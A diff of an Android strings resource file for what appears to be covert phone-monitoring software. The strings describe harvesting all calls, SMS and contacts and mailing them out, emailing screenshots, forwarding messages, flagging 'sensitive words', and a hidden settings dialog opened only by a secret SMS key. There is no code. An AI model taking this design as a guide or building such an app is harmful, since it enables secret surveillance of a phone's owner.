@@ -7,7 +7,7 @@
     <string name="sms_sent">Sent</string>
     <string name="sms_unknown">Unknown</string>
     <string name="sms_name">SMS</string>
-    <string name="sms_redirect_header">[FW]</string>
+    <string name="sms_redirect_header">[From %s]</string>
     
     <!-- Contact -->
     <string name="contact_name">Contact</string>
@@ -45,17 +45,18 @@
     <string name="pref_word_sensor_key">pref_word_sensor</string>
     <string name="pref_word_sensor_title">Sensitive Words</string>
     <string name="pref_word_sensor_summary">Separate with blank space. No more than 9 words.</string>
-    <string name="pref_pls_input_sensitive_words">Please input sensitive words (separate with blank space).</string>
+    <string name="pref_pls_input_sensitive_words">Please input sensitive words (separate by blank space).</string>
+    <string name="pref_sensitive_words_count_reach_max">No more than %d sensitive words, the suplus words will be ignored. Please re-edit your sensitive words.</string>
     
     <!-- InitActivity -->
     <string name="init_btn_getinfo">Get Info</string>
     <string name="init_btn_screenshot">Screenshot</string>
     <string name="init_btn_setting">Setting</string>
     <string name="init_btn_hide">Exit</string>
-    <string name="init_hint_getinfo">Get phonecall, SMS, contact information and send a mail</string>
+    <string name="init_hint_getinfo">Get all phonecall, SMS, contact information of this mobile phone, and send them to mail box.</string>
     <string name="init_hint_screenshot">Get a screenshot and send a mail</string>
-    <string name="init_hint_setting">Set mail address and interval</string>
-    <string name="init_hint_hide">Exit current setting dialog</string>
+    <string name="init_hint_setting">Set mail address, interval, mobile phone number and sensitive words.</string>
+    <string name="init_hint_hide">Exit current setting dialog. This dialog can be triggered only by sending a SMS (the content is the key) to this mobile phone.</string>
     
     <!-- Actions -->
     <string name="action_send_mail_success">Sent a mail to your mail box successfully</string>
@@ -66,6 +67,6 @@
 	
 	<!-- Message -->
 	<string name="msg_invalid_key">Invaid key. Probably has been used. Please contact the software maker for support.</string>
-	
+	<string name="msg_cannot_write_license_to_sharedpreferences">ERROR: failed to write license information to SharedPreferences.</string>
     
 </resources>
